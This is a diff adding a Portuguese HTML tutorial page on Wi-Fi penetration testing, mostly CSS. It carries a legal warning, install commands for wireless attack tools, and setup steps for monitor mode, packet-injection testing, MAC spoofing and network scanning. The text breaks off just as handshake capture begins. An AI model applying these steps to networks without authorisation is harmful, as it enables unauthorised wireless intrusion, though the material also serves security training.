@@ -1,0 +1,2189 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Pentesting - CyberHack</title>
+    
+    <link rel="icon" href="r.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="r.png" type="image/x-icon" />
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', 'Courier New', monospace;
+            color: #fff;
+            user-select: none;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap');
+
+        body {
+            background-color: #000000;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        #canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        header {
+            padding: 20px 0;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+
+        .logo::before {
+            content: '';
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #ff69b4;
+            margin-right: 10px;
+            box-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.7; }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            position: relative;
+            transition: color 0.3s;
+        }
+        
+        .home-btn {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(255, 20, 147, 0.4);
+            transition: all 0.3s ease !important;
+        }
+        
+        .home-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.6);
+            color: #fff !important;
+        }
+        
+        .home-btn::after {
+            display: none;
+        }
+
+        .nav-links a:hover {
+            color: #ff69b4;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff69b4, transparent);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .hero {
+            height: 400px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            margin-bottom: 50px;
+            perspective: 1000px;
+        }
+
+        .hero-content {
+            position: relative;
+            transform-style: preserve-3d;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px) rotateX(0deg); }
+            50% { transform: translateY(-20px) rotateX(5deg); }
+            100% { transform: translateY(0px) rotateX(0deg); }
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 700;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            position: relative;
+        }
+
+        .hero h1::before,
+        .hero h1::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .hero h1::before {
+            left: 2px;
+            text-shadow: -1px 0 #00ffea;
+            animation: glitch-before 3s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        .hero h1::after {
+            left: -2px;
+            text-shadow: 1px 0 #ff00c1;
+            animation: glitch-after 2s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+
+        @keyframes glitch-before {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(30% 0 25% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        @keyframes glitch-after {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(10% 0 40% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 800px;
+            margin-bottom: 30px;
+        }
+
+        .toc-container {
+            background: rgba(10, 10, 10, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+        
+        .toc-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 105, 180, 0.1), transparent);
+            transform: rotate(25deg);
+            animation: glare 7s linear infinite;
+            z-index: -1;
+        }
+        
+        @keyframes glare {
+            0% { transform: translateX(-100%) rotate(25deg); }
+            100% { transform: translateX(100%) rotate(25deg); }
+        }
+        
+        .toc-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            padding-bottom: 10px;
+        }
+        
+        .toc-list {
+            list-style-type: none;
+            counter-reset: item;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 10px;
+        }
+        
+        .toc-list li {
+            counter-increment: item;
+            margin-bottom: 5px;
+            position: relative;
+            padding-left: 30px;
+        }
+        
+        .toc-list li::before {
+            content: counter(item);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 22px;
+            height: 22px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-radius: 50%;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .toc-list a {
+            text-decoration: none;
+            color: rgba(255, 255, 255, 0.8);
+            transition: all 0.3s ease;
+            display: block;
+            padding: 5px 0;
+        }
+        
+        .toc-list a:hover {
+            color: #ff69b4;
+            transform: translateX(5px);
+        }
+
+        .content-section {
+            background: rgba(10, 10, 10, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+        
+        .content-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #ff1493, #ff69b4, #ff1493);
+            z-index: 1;
+        }
+
+        .section-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 70%;
+            height: 2px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+
+        .section-subtitle {
+            font-size: 22px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin: 25px 0 15px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .section-subtitle::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 50%;
+            height: 1px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+
+        .content-section p {
+            font-size: 16px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+        }
+
+        .info-box {
+            background: rgba(20, 20, 20, 0.7);
+            border-left: 4px solid #ff69b4;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .info-box.warning {
+            border-left-color: #ff9800;
+        }
+        
+        .info-box.danger {
+            border-left-color: #f44336;
+        }
+        
+        .info-box.tip {
+            border-left-color: #4CAF50;
+        }
+        
+        .info-box-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #ff69b4;
+        }
+        
+        .info-box.warning .info-box-title {
+            color: #ff9800;
+        }
+        
+        .info-box.danger .info-box-title {
+            color: #f44336;
+        }
+        
+        .info-box.tip .info-box-title {
+            color: #4CAF50;
+        }
+        
+        .info-box p {
+            margin-bottom: 0;
+        }
+
+        .code-box {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow-x: auto;
+            position: relative;
+        }
+        
+        .code-box::before {
+            content: 'Terminal';
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            background: #000;
+            padding: 0 10px;
+            font-size: 12px;
+            color: #ff69b4;
+            font-weight: 600;
+        }
+        
+        .code-box code {
+            display: block;
+            line-height: 1.5;
+        }
+        
+        .cmd {
+            color: #00ff00;
+        }
+        
+        .comment {
+            color: #888;
+        }
+        
+        .result {
+            color: #aaa;
+        }
+        
+        .highlight {
+            color: #ff69b4;
+            font-weight: bold;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .tool-card {
+            background: rgba(20, 20, 20, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .tool-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #ff1493, #ff69b4);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.4s ease;
+        }
+        
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.2);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+        
+        .tool-card:hover::before {
+            transform: scaleX(1);
+        }
+        
+        .tool-name {
+            font-size: 20px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .tool-name i {
+            margin-right: 10px;
+            font-size: 24px;
+        }
+        
+        .tool-desc {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 15px;
+        }
+        
+        .tool-usage {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px;
+            border-radius: 5px;
+            border-left: 2px solid #ff69b4;
+            margin-top: 10px;
+        }
+
+        .step-list {
+            list-style-type: none;
+            counter-reset: step;
+            margin: 20px 0;
+        }
+        
+        .step-list li {
+            counter-increment: step;
+            margin-bottom: 15px;
+            position: relative;
+            padding-left: 40px;
+            padding-bottom: 15px;
+            border-left: 1px dashed rgba(255, 105, 180, 0.5);
+        }
+        
+        .step-list li:last-child {
+            border-left: none;
+            padding-bottom: 0;
+        }
+        
+        .step-list li::before {
+            content: counter(step);
+            position: absolute;
+            left: -15px;
+            top: 0;
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-radius: 50%;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .step-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 8px;
+        }
+        
+        .step-desc {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.6;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: rgba(10, 10, 10, 0.5);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .comparison-table th {
+            background: rgba(255, 105, 180, 0.2);
+            padding: 12px 15px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 16px;
+            color: #ff69b4;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+        }
+        
+        .comparison-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .comparison-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .comparison-table tr:hover td {
+            background: rgba(255, 105, 180, 0.05);
+        }
+
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+        }
+
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #ff69b4;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+
+        .social-links a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            color: #ff69b4;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            background: rgba(255, 105, 180, 0.2);
+            transform: translateY(-3px);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 20px;
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+            cursor: pointer;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+        
+        .back-to-top.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(255, 20, 147, 0.6);
+        }
+
+        @media (max-width: 992px) {
+            .tools-grid {
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            }
+            .hero h1 {
+                font-size: 36px;
+            }
+            .toc-list {
+                grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+            }
+        }
+
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            .nav-links {
+                display: none;
+            }
+            .mobile-menu-btn {
+                display: block;
+            }
+            .hero h1 {
+                font-size: 28px;
+            }
+            .section-title {
+                font-size: 24px;
+            }
+            .section-subtitle {
+                font-size: 20px;
+            }
+            .toc-list {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: #ff69b4;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            display: none;
+        }
+
+        #overlay.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="container">
+        <header>
+            <div class="logo">CyberHack</div>
+            <nav class="nav-links">
+                <a href="index.html" class="home-btn"><i class="fas fa-home"></i> Home</a>
+                <a href="#introducao">Introdução</a>
+                <a href="#ferramentas">Ferramentas</a>
+                <a href="#capturas">Captura de Handshakes</a>
+                <a href="#ataque-wpa">Ataques WPA/WPA2</a>
+                <a href="#redes-falsas">Redes Falsas</a>
+                <a href="#defesas">Defesas</a>
+            </nav>
+            <button class="mobile-menu-btn">
+                <i class="fas fa-bars"></i>
+            </button>
+        </header>
+
+        <section class="hero">
+            <div class="hero-content">
+                <h1 data-text="Wi-Fi Pentesting">Wi-Fi Pentesting</h1>
+                <p>Técnicas avançadas de auditoria, análise e exploração de vulnerabilidades em redes sem fio para profissionais de segurança.</p>
+            </div>
+        </section>
+
+        <div class="toc-container">
+            <h2 class="toc-title">Conteúdo</h2>
+            <ul class="toc-list">
+                <li><a href="#introducao">Introdução ao Wi-Fi Pentesting</a></li>
+                <li><a href="#aviso-legal">Aviso Legal e Ético</a></li>
+                <li><a href="#ferramentas">Ferramentas Essenciais</a></li>
+                <li><a href="#preparacao">Preparação do Ambiente</a></li>
+                <li><a href="#capturas">Captura de Handshakes WPA/WPA2</a></li>
+                <li><a href="#ataque-wpa">Ataques de Força Bruta WPA/WPA2</a></li>
+                <li><a href="#ataque-wep">Ataques a Redes WEP</a></li>
+                <li><a href="#ataque-pmkid">Ataque PMKID</a></li>
+                <li><a href="#redes-falsas">Criação de Redes Falsas (Evil Twin)</a></li>
+                <li><a href="#ap-clone">Clonagem de Pontos de Acesso</a></li>
+                <li><a href="#desautenticacao">Ataques de Desautenticação</a></li>
+                <li><a href="#wps">Ataques a WPS</a></li>
+                <li><a href="#krack">Ataque KRACK</a></li>
+                <li><a href="#defesas">Técnicas de Defesa</a></li>
+                <li><a href="#outras-ferramentas">Outras Ferramentas Avançadas</a></li>
+                <li><a href="#recursos">Recursos Adicionais</a></li>
+            </ul>
+        </div>
+
+        <section id="introducao" class="content-section">
+            <h2 class="section-title">Introdução ao Wi-Fi Pentesting</h2>
+            <p>O teste de penetração em redes Wi-Fi, também conhecido como Wi-Fi Pentesting, é uma abordagem sistemática para avaliar a segurança de redes sem fio. Este processo envolve a identificação e exploração de vulnerabilidades em configurações, protocolos e implementações de redes Wi-Fi para determinar os riscos potenciais e as falhas de segurança.</p>
+            
+            <p>Com o avanço das tecnologias sem fio, as redes Wi-Fi se tornaram componentes críticos da infraestrutura moderna de comunicação. No entanto, sem as medidas de segurança adequadas, estas redes podem se tornar pontos de entrada para ataques cibernéticos. O pentesting Wi-Fi permite aos profissionais de segurança identificar proativamente as vulnerabilidades antes que possam ser exploradas por atacantes maliciosos.</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">Objetivos do Wi-Fi Pentesting</div>
+                <p>• Identificar redes sem fio vulneráveis e seus pontos fracos<br>
+                • Testar a resistência de protocolos de segurança implementados<br>
+                • Validar a eficácia de configurações de segurança<br>
+                • Detectar dispositivos não autorizados na rede<br>
+                • Avaliar a resistência contra ataques comuns<br>
+                • Verificar a implementação correta de controles de acesso<br>
+                • Identificar configurações incorretas que poderiam levar a violações</p>
+            </div>
+        </section>
+
+        <section id="aviso-legal" class="content-section">
+            <h2 class="section-title">Aviso Legal e Ético</h2>
+            
+            <div class="info-box danger">
+                <div class="info-box-title"><i class="fas fa-exclamation-triangle"></i> ALERTA IMPORTANTE</div>
+                <p>As técnicas, ferramentas e métodos descritos neste conteúdo são fornecidos EXCLUSIVAMENTE para fins educacionais e de teste de segurança legítimo. A execução não autorizada destas técnicas em redes ou sistemas sem o consentimento explícito do proprietário é ILEGAL e pode resultar em:</p>
+                <p>• Processos criminais<br>
+                • Sanções civis<br>
+                • Penalidades financeiras<br>
+                • Prisão</p>
+            </div>
+            
+            <h3 class="section-subtitle">Diretrizes Éticas</h3>
+            <p>Ao realizar testes de penetração em redes Wi-Fi, siga estas diretrizes éticas essenciais:</p>
+            
+            <ol class="step-list">
+                <li>
+                    <div class="step-title">Obtenha Autorização Explícita</div>
+                    <div class="step-desc">Sempre obtenha permissão por escrito do proprietário da rede antes de iniciar qualquer teste. Documente o escopo, a duração e os métodos permitidos.</div>
+                </li>
+                <li>
+                    <div class="step-title">Respeite os Limites</div>
+                    <div class="step-desc">Restrinja seus testes apenas às redes especificadas na autorização. Nunca expanda para redes adjacentes, mesmo que sejam acessíveis.</div>
+                </li>
+                <li>
+                    <div class="step-title">Minimize o Impacto</div>
+                    <div class="step-desc">Conduza os testes de forma a minimizar interrupções no serviço. Evite ataques de negação de serviço (DoS) sempre que possível.</div>
+                </li>
+                <li>
+                    <div class="step-title">Proteja os Dados</div>
+                    <div class="step-desc">Não capture, armazene ou examine dados de usuários. Se dados sensíveis forem inadvertidamente acessados, notifique imediatamente o proprietário da rede.</div>
+                </li>
+                <li>
+                    <div class="step-title">Relate as Descobertas</div>
+                    <div class="step-desc">Documente todas as vulnerabilidades encontradas e forneça recomendações claras para mitigação. Destrua todos os dados capturados após a conclusão.</div>
+                </li>
+            </ol>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Lembre-se</div>
+                <p>Utilize sempre seu próprio ambiente de laboratório para praticar técnicas de hacking antes de realizar testes em ambientes de produção. Ambientes virtuais, como o VirtualBox com múltiplas VMs, ou redes de testes físicas isoladas são excelentes para este propósito.</p>
+            </div>
+        </section>
+
+        <section id="ferramentas" class="content-section">
+            <h2 class="section-title">Ferramentas Essenciais</h2>
+            <p>O Wi-Fi pentesting exige um conjunto específico de ferramentas para identificar, analisar e explorar vulnerabilidades em redes sem fio. A maioria dessas ferramentas vem pré-instalada no Kali Linux, uma distribuição Linux especializada em testes de penetração.</p>
+            
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-wifi"></i> Aircrack-ng</div>
+                    <div class="tool-desc">Suite completa para avaliação de segurança Wi-Fi. Inclui ferramentas para monitoramento, ataque e testes de segurança em redes 802.11.</div>
+                    <div class="tool-usage">sudo apt install aircrack-ng</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-satellite-dish"></i> Wifite</div>
+                    <div class="tool-desc">Ferramenta automatizada para auditoria de múltiplas redes Wi-Fi. Simplifica o processo de pentesting com uma interface amigável.</div>
+                    <div class="tool-usage">sudo apt install wifite</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-fingerprint"></i> Hashcat</div>
+                    <div class="tool-desc">O cracker de senha mais rápido do mundo, útil para ataques de força bruta e dicionário contra handshakes WPA/WPA2 capturados.</div>
+                    <div class="tool-usage">sudo apt install hashcat</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-ghost"></i> Ghost Phisher</div>
+                    <div class="tool-desc">Framework para criação de redes falsas (Evil Twin) com interfaces gráficas para DNS, HTTP e DHCP spoofing.</div>
+                    <div class="tool-usage">sudo apt install ghost-phisher</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-network-wired"></i> Wireshark</div>
+                    <div class="tool-desc">Analisador de protocolo de rede para captura e análise interativa de tráfego de rede sem fio.</div>
+                    <div class="tool-usage">sudo apt install wireshark</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-laptop-code"></i> Bettercap</div>
+                    <div class="tool-desc">Framework moderno para MITM (Man-in-the-Middle) com módulos específicos para interceptação e análise de redes Wi-Fi.</div>
+                    <div class="tool-usage">sudo apt install bettercap</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-key"></i> Airgeddon</div>
+                    <div class="tool-desc">Script bash multi-uso para auditoria de redes sem fio com interface de usuário baseada em terminal.</div>
+                    <div class="tool-usage">git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-shield-alt"></i> Kismet</div>
+                    <div class="tool-desc">Detector de rede, sniffer de pacotes e sistema de detecção de intrusão para redes 802.11.</div>
+                    <div class="tool-usage">sudo apt install kismet</div>
+                </div>
+            </div>
+            
+            <h3 class="section-subtitle">Hardware Recomendado</h3>
+            <p>Além do software adequado, o hardware correto é essencial para testes eficazes de redes sem fio:</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">Adaptadores Wi-Fi Compatíveis</div>
+                <p>Para realizar pentest Wi-Fi eficaz, você precisa de adaptadores que suportem modo monitor e injeção de pacotes. Recomendações:</p>
+                <p>• <strong>Alfa AWUS036ACH</strong>: Suporta 2.4GHz e 5GHz, compatível com Kali Linux<br>
+                • <strong>Alfa AWUS036NHA</strong>: Excelente para 2.4GHz, com antena de alto ganho<br>
+                • <strong>TP-Link TL-WN722N v1</strong>: Adaptador econômico com bom desempenho (apenas v1)<br>
+                • <strong>Panda PAU09</strong>: Dual-band com antenas destacáveis</p>
+            </div>
+        </section>
+
+        <section id="preparacao" class="content-section">
+            <h2 class="section-title">Preparação do Ambiente</h2>
+            <p>Antes de iniciar qualquer teste de penetração em redes Wi-Fi, é necessário configurar corretamente seu ambiente. Esta preparação inclui a verificação da compatibilidade do adaptador, configuração do modo monitor e outras etapas essenciais.</p>
+            
+            <h3 class="section-subtitle">Verificação de Compatibilidade do Adaptador</h3>
+            <p>Primeiro, verifique se seu adaptador Wi-Fi suporta modo monitor e injeção de pacotes:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airmon-ng</span></code>
+                <code><span class="result">[sudo] password for user:</span></code>
+                <code><span class="result">PHY     Interface     Driver     Chipset</span></code>
+                <code><span class="result">phy0    wlan0         rt2800usb  Ralink Technology, Corp. RT5370</span></code>
+            </div>
+            
+            <p>Se seu adaptador estiver listado, provavelmente é compatível. Para verificar se suporta injeção de pacotes:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo aireplay-ng --test wlan0</span></code>
+                <code><span class="result">15:24:08  Trying broadcast probe requests...</span></code>
+                <code><span class="result">15:24:08  Injection is working!</span></code>
+                <code><span class="result">15:24:10  Found 3 APs</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Habilitando o Modo Monitor</h3>
+            <p>O modo monitor permite que seu adaptador capture pacotes sem estar associado a um ponto de acesso:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airmon-ng check kill</span> <span class="comment"># Mata processos que podem interferir</span></code>
+                <code><span class="result">Killing these processes:</span></code>
+                <code><span class="result">PID Name</span></code>
+                <code><span class="result">1234 wpa_supplicant</span></code>
+                <code><span class="cmd">sudo airmon-ng start wlan0</span> <span class="comment"># Ativa o modo monitor</span></code>
+                <code><span class="result">PHY     Interface     Driver     Chipset</span></code>
+                <code><span class="result">phy0    wlan0mon      rt2800usb  Ralink Technology, Corp. RT5370</span></code>
+            </div>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Dica Prática</div>
+                <p>Em algumas versões mais recentes do Kali Linux, você pode usar diretamente:</p>
+                <p><code>sudo ip link set wlan0 down</code><br>
+                <code>sudo iw wlan0 set monitor control</code><br>
+                <code>sudo ip link set wlan0 up</code></p>
+            </div>
+            
+            <h3 class="section-subtitle">Alterando o Endereço MAC (Opcional)</h3>
+            <p>Para testes anônimos, é recomendável alterar o endereço MAC do adaptador:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo ifconfig wlan0mon down</span></code>
+                <code><span class="cmd">sudo macchanger -r wlan0mon</span> <span class="comment"># MAC aleatório</span></code>
+                <code><span class="result">Current MAC: 00:11:22:33:44:55 (unknown)</span></code>
+                <code><span class="result">Permanent MAC: AA:BB:CC:DD:EE:FF (unknown)</span></code>
+                <code><span class="result">New MAC: 01:23:45:67:89:AB (unknown)</span></code>
+                <code><span class="cmd">sudo ifconfig wlan0mon up</span></code>
+            </div>
+            
+            <div class="info-box warning">
+                <div class="info-box-title">Atenção</div>
+                <p>Certifique-se de que o modo monitor está funcionando corretamente antes de prosseguir. Alguns adaptadores podem apresentar problemas com drivers específicos e podem exigir configurações adicionais.</p>
+            </div>
+        </section>
+
+        <section id="capturas" class="content-section">
+            <h2 class="section-title">Captura de Handshakes WPA/WPA2</h2>
+            <p>O handshake WPA/WPA2 é um processo de autenticação que ocorre quando um cliente se conecta a uma rede protegida. Capturar este handshake permite que ele seja usado posteriormente para testes de força bruta.</p>
+            
+            <h3 class="section-subtitle">Escaneando Redes Disponíveis</h3>
+            <p>Primeiro, identifique as redes Wi-Fi disponíveis e seus canais:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo airodump-ng wlan0mon</span></code>
+                <code><span class="result">CH 13 ][ Elapsed: 1 min ][ 2023-09-27 15:30 </span></code>
+                <code><span class="result">BSSID              PWR  Beacons  #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</span></code>
+                <code><span class="result">AA:BB:CC:DD:EE:FF  -55  234      12    0    6   54e  WPA2 CCMP   PSK  RedeWiFi</span></code>
+                <code><span class="result">11:22:33:44:55:66  -67  187      0     0    1   54e  WPA2 CCMP   PSK  OutraRede</span></code>
+                <code><span class="result">BSSID              STATION            PWR   Rate   Lost  Frames  Probe</span></code>
+                <code><span class="result">AA:BB:CC:DD:EE:FF  22:33:44:55:66:77  -52   0 - 1    0     6     RedeWiFi</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Capturando o Handshake</h3>
+            <p>Após identificar a rede alvo, foque na captura de seu tráfego específico:</p>
+            
+            <div class="code-box">
